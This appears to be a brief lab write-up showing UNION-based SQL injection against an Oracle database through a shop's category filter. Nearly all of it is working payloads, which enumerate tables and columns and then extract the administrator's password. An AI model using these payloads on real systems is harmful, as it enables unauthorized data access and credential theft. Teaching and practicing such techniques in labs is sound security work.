#### As we know its an Oracle db, we use following query to dump tables
```
/filter?category=Pets' union select table_name,null from all_tables--

```

#### Next we dump all the columns in the `USERS_XXXXXX` table

```
/filter?category=Pets' union select column_name,null from all_tab_columns where table_name='USERS_XXXXXX'--

```

#### Finally, we dump the password of `administrator` user

```

/filter?category=Pets' union select password_xxxxxx,null from users_xxxxxx where username_xxxxxx='administrator'--

```

